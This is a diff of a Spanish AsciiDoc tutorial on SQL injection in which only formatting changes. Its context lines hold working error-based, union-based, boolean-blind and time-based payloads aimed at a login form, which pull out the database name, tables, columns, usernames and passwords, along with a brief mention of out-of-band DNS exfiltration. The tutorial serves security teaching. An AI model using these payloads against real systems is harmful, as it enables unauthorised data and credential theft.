@@ -1,6 +1,5 @@
 = Avaricia
 :author: Manuel L. Quero
-:revdate: 2025-04-10
 :toc: left
 :doctype: book
 
@@ -101,8 +100,10 @@ Contraseña: 1234
 
 Al poner esa comilla simple, se cierra la consulta que hace la web al servidor de mysql, por lo que el resto sería un error en la sintaxis de sql.
 
+[.text-center]
 image::assets/in-band/error-based/Recon1.png[Reconocimiento1]
 
+[.text-center]
 image::assets/in-band/error-based/Recon2.png[Reconocimiento2]
 
 ===== Payloads
@@ -123,14 +124,16 @@ Contraseña:
 * *'* -> Esto es un carácter de comilla simple que cierra la consulta original y nos permite iniciar la nuestra.
 * *AND* -> Añadimos una condición a la consulta original.
 * *updatexml()* -> La función intenta procesar una expresión XML, pero si se le pasa un valor que no es válido como XML (en este caso, un valor concatenado con concat), lanzará un error. El contenido que se pase dentro de concat() se convierte en el mensaje de error, lo que permite al atacante obtener información sensible.
-- *null* -> Sirve para no afectar al ataque.
-- *concat(0x3a, @@version)* -> Con esto, concatenaremos varias cadenas, el valor de _0x3a_ en hexadecimal corresponde con el carácter :, que se usará como separador entre los valores concatenados. Y _@@version_ es una variable global en MySQL que devuelve la versión del servidor.
-- *null* -> Sirve para no afectar al ataque.
-- *--* -> Sirven para que el resto de consulta sea comentado y sea ignorado.
-- *'* -> Este carácter es para cerrar la otra comilla simple y que no nos de ningún error, y así se pueda comentar el resto de la consulta correctamente.
+** *null* -> Sirve para no afectar al ataque.
+** *concat(0x3a, @@version)* -> Con esto, concatenaremos varias cadenas, el valor de _0x3a_ en hexadecimal corresponde con el carácter :, que se usará como separador entre los valores concatenados. Y _@@version_ es una variable global en MySQL que devuelve la versión del servidor.
+** *null* -> Sirve para no afectar al ataque.
+** *--* -> Sirven para que el resto de consulta sea comentado y sea ignorado.
+** *'* -> Este carácter es para cerrar la otra comilla simple y que no nos de ningún error, y así se pueda comentar el resto de la consulta correctamente.
 
+[.text-center]
 image::assets/in-band/error-based/Version1.png[Version1]
 
+[.text-center]
 image::assets/in-band/error-based/Version2.png[Version2]
 
 *Obtener el nombre de la base de datos actual*
@@ -144,8 +147,10 @@ Como podemos ver la sintaxis es la misma que el anterior pero cambia el contenid
 
 * *database()* -> Esta es una función de MySQL que devuelve el nombre de la base de datos actual a la que está conectado el servidor MySQL.
 
+[.text-center]
 image::assets/in-band/error-based/BaseDatos1.png[BaseDatos1]
 
+[.text-center]
 image::assets/in-band/error-based/BaseDatos2.png[BaseDatos2]
 
 *Obtener el nombre de la primera tabla*
@@ -161,8 +166,10 @@ Contraseña:
 
 * *LIMIT 0,1* -> Esto limita los resultados de la consulta a una sola fila. De esta forma obtendremos solo el primer nombre de tabla de la base de datos.
 
+[.text-center]
 image::assets/in-band/error-based/Usuarios1.png[TablaUsuarios1]
 
+[.text-center]
 image::assets/in-band/error-based/Usuarios2.png[TablaUsuarios2]
 
 *Obtener el nombre de la primera columna de una tabla*
@@ -178,8 +185,10 @@ Contraseña:
 
 * *LIMIT 0,1* -> Limitamos el resultado a solo una columna para facilitar la consulta y evitar que se devuelvan demasiados resultados.
 
+[.text-center]
 image::assets/in-band/error-based/Colum1.png[Columna1]
 
+[.text-center]
 image::assets/in-band/error-based/Colum2.png[Columna2]
 
 *Extraer usuarios y contraseñas (u otras columnas)*
@@ -191,8 +200,10 @@ Contraseña:
 
 Como ya sabemos la tabla y podemos conocer las distintas columnas que tiene, se hace más sencilla la busqueda de información. En este caso, vamos a extraer el nombre del primer usuario.
 
+[.text-center]
 image::assets/in-band/error-based/Nombre1.png[NombreUsuarios1]
 
+[.text-center]
 image::assets/in-band/error-based/Nombre2.png[NombreUsuarios2]
 
 ----
@@ -202,8 +213,10 @@ Contraseña:
 
 También podemos ver las contraseñas si sabes la columna en la que están. Si queremos ver otros datos de la misma columna podemos cambiar el LIMIT a LIMIT(1,1).
 
+[.text-center]
 image::assets/in-band/error-based/Contraseñas1.png[Contraseñas1]
 
+[.text-center]
 image::assets/in-band/error-based/Contraseñas2.png[Contraseñas2]
 
 ==== b. Union-based SQL injection
@@ -229,8 +242,10 @@ Aclarar que los (...) son NULL en caso que la tabla tenga más columnas. Si la t
 
 De esta forma, sabremos la estructura de la tabla y podremos incluso acceder, aunque no tengamos datos de nadie todavía. Esto nos permitirá inyectar datos específicos.
 
+[.text-center]
 image::assets/in-band/union-based/Recon1.png[Reconocimiento1]
 
+[.text-center]
 image::assets/in-band/union-based/Recon2.png[Reconocimiento2]
 
 ===== Payloads
@@ -244,8 +259,10 @@ Contraseña:
 
 Este payload lo que nos mostrará será el nombre de la base de datos en la posición que pongamos database(), es decir, si la tabla tiene seis columnas y en la cuenta se muestran los datos de las tres últimas columnas, tendremos que poner database() en alguna de esas posiciones para obtener los datos, en este caso el nombre de la base de datos.
 
+[.text-center]
 image::assets/in-band/union-based/BaseDatos1.png[BaseDatos1]
 
+[.text-center]
 image::assets/in-band/union-based/BaseDatos2.png[BaseDatos2]
 
 *Recuperar el nombre de las tablas*
@@ -259,8 +276,10 @@ Contraseña:
 
 * *information_schema.tables* -> Esta tabla contiene información sobre todas las tablas en todas las bases de datos en MySQL. La consulta se limita a la base de datos actual utilizando WHERE *table_schema=database()*.
 
+[.text-center]
 image::assets/in-band/union-based/Tablas1.png[NombreTablas1]
 
+[.text-center]
 image::assets/in-band/union-based/Tablas2.png[NombreTablas2]
 
 *Recuperar los nombres de las columnas de una tabla específica*
@@ -274,8 +293,10 @@ Contraseña:
 
 * *information_schema.columns* -> Esta tabla contiene información sobre todas las columnas de todas las tablas en MySQL. Al limitarla por table_name='usuarios', obtenemos los nombres de las columnas de la tabla usuarios.
 
+[.text-center]
 image::assets/in-band/union-based/Columnas1.png[Columnas1]
 
+[.text-center]
 image::assets/in-band/union-based/Columnas2.png[Columnas2]
 
 *Extraer datos de las columnas (usuarios, contraseñas u otras columnas)*
@@ -287,8 +308,10 @@ Contraseña:
 
 * *group_concat(usuario)* -> Aquí estamos extrayendo los datos de la columna usuario de la tabla usuarios y concatenándolos para que todos los nombres de usuario sean devueltos en una sola cadena separada por comas.
 
+[.text-center]
 image::assets/in-band/union-based/Usuarios1.png[Usuarios1]
 
+[.text-center]
 image::assets/in-band/union-based/Usuarios2.png[Usuarios2]
 
 ----
@@ -298,8 +321,10 @@ Contraseña:
 
 * *group_concat(password)* -> Similar al paso anterior, pero en este caso estamos extrayendo los valores de la columna password de la tabla usuarios.
 
+[.text-center]
 image::assets/in-band/union-based/Contraseñas1.png[Contraseñas1]
 
+[.text-center]
 image::assets/in-band/union-based/Contraseñas2.png[Contraseñas2]
 
 === 2. Blind SQL Injection
@@ -319,8 +344,10 @@ Usuario: admin' AND 1=1 --
 Contraseña: 
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/Recon1.png[Reconocimiento1]
 
+[.text-center]
 image::assets/blind/boolean-based/Recon2.png[Reconocimiento2]
 
 ----
@@ -328,8 +355,10 @@ Usuario: admin' AND 1=2 --
 Contraseña: 
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/Recon3.png[Reconocimiento3]
 
+[.text-center]
 image::assets/blind/boolean-based/Recon4.png[Reconocimiento4]
 
 ===== Payloads
@@ -348,8 +377,10 @@ Y así deberemos seguir con cada letra, obviamente esto no está pensado para ha
 * *SUBSTRING(database(),1,1)* -> Toma el primer carácter del nombre de la base de datos. Para pasar al siguiente caracter sería SUBSTRING(database(),2,1), etc.
 * *= 'b'* -> Compara si ese carácter es 'b'.
 
+[.text-center]
 image::assets/blind/boolean-based/BaseDatos1.png[BaseDatos1]
 
+[.text-center]
 image::assets/blind/boolean-based/BaseDatos2.png[BaseDatos2]
 
 ----
@@ -357,8 +388,10 @@ Usuario: admin' AND SUBSTRING(database(),1,1) = 'b' --
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/BaseDatos3.png[BaseDatos3]
 
+[.text-center]
 image::assets/blind/boolean-based/BaseDatos4.png[BaseDatos4]
 
 *Inferir nombre de tablas*
@@ -370,8 +403,10 @@ Usuario: admin' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.ta
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/Tablas1.png[Tablas1]
 
+[.text-center]
 image::assets/blind/boolean-based/Tablas2.png[Tablas2]
 
 ----
@@ -379,8 +414,10 @@ Usuario: admin' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.ta
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/Tablas3.png[Tablas3]
 
+[.text-center]
 image::assets/blind/boolean-based/Tablas4.png[Tablas4]
 
 Este payload consulta la primera tabla del esquema actual y verifica si empieza con la letra 'u'. Se van cambiando posiciones (LIMIT 1,1, LIMIT 2,1, etc.) y posiciones del carácter (SUBSTRING(...,2,1), etc.) para inferir cada tabla y cada letra.
@@ -394,8 +431,10 @@ Usuario: admin' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.c
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/Columnas1.png[Columnas1]
 
+[.text-center]
 image::assets/blind/boolean-based/Columnas2.png[Columnas2]
 
 Y al igual que el resto se debe de ir carácter por carácter para obtener la pálabra correcta. Se van cambiando posiciones (LIMIT 1,1, LIMIT 2,1, etc.) y posiciones del carácter (SUBSTRING(...,2,1), etc.) para inferir cada tabla y cada letra.
@@ -409,8 +448,10 @@ Usuario: admin' AND (SELECT SUBSTRING(usuario,1,1) FROM usuarios LIMIT 1,1) = 'u
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/Contraseña1.png[Contraseña1]
 
+[.text-center]
 image::assets/blind/boolean-based/Contraseña2.png[Contraseña2]
 
 ----
@@ -418,8 +459,10 @@ Usuario: admin' AND (SELECT SUBSTRING(usuario,2,1) FROM usuarios LIMIT 1,1) = 's
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/boolean-based/Contraseña3.png[Contraseña3]
 
+[.text-center]
 image::assets/blind/boolean-based/Contraseña4.png[Contraseña4]
 
 ===== Aclaración
@@ -439,8 +482,10 @@ Usuario: admin' AND IF(1=1, SLEEP(5), 0) --
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/time/Recon1.png[Reconocimiento1]
 
+[.text-center]
 image::assets/blind/time/Recon2.png[Reconocimiento2]
 
 ----
@@ -448,8 +493,10 @@ Usuario: admin' AND IF(1=2, SLEEP(5), 0) --
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/time/Recon3.png[Reconocimiento3]
 
+[.text-center]
 image::assets/blind/time/Recon4.png[Reconocimiento4]
 
 * *AND IF(1=1, SLEEP(5), 0)* -> Si la condición 1=1 es verdadera (siempre lo es), el servidor ejecutará SLEEP(5) y causará un retraso de 5 segundos.
@@ -465,8 +512,10 @@ Usuario: admin' AND IF(SUBSTRING(DATABASE(),1,1) = 'b', SLEEP(5), 0) --
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/time/BaseDatos1.png[BaseDatos1]
 
+[.text-center]
 image::assets/blind/time/BaseDatos2.png[BaseDatos2]
 
 ----
@@ -479,9 +528,9 @@ admin' AND IF(SUBSTRING(DATABASE(),5,1) = 'o', SLEEP(5), 0) --
 
 * *IF(SUBSTRING(DATABASE(),1,1) = 'a', SLEEP(5), 0)* -> Si el primer carácter es 'a', el servidor esperará 5 segundos (esto es el ataque Time-Based).
 
-- *SUBSTRING(DATABASE(),1,1)* -> Extrae el primer carácter del nombre de la base de datos.
+** *SUBSTRING(DATABASE(),1,1)* -> Extrae el primer carácter del nombre de la base de datos.
 
-. *DATABASE()* Función de MySQL que devuelve el nombre de la base de datos actual.
+*** *DATABASE()* Función de MySQL que devuelve el nombre de la base de datos actual.
 
 *Obtener tablas sobre la base de datos*
 
@@ -491,8 +540,11 @@ En este caso vamos a buscar la tabla *usuarios*
 Usuario: admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),1,1) = 'u', SLEEP(5), 0) -- 
 Contraseña:
 ----
+
+[.text-center]
 image::assets/blind/time/Tablas1.png[Tablas1]
 
+[.text-center]
 image::assets/blind/time/Tablas2.png[Tablas2]
 
 ----
@@ -521,8 +573,10 @@ Usuario: admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.col
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/time/Columnas1.png[Columnas1]
 
+[.text-center]
 image::assets/blind/time/Columnas2.png[Columnas2]
 
 ----
@@ -541,8 +595,10 @@ Usuario: admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),1,1) = 
 Contraseña:
 ----
 
+[.text-center]
 image::assets/blind/time/Contraseña1.png[Contraseña1]
 
+[.text-center]
 image::assets/blind/time/Contraseña2.png[Contraseña2]
 
 ----
@@ -596,6 +652,7 @@ En este caso, el servidor de la base de datos realiza una consulta a un dominio 
 El atacante puede ver esta consulta en su servidor DNS y extraer la información.
 ----
 
+[.text-center]
 image::assets/oob/OOB.png[OOB]
 
 <<<
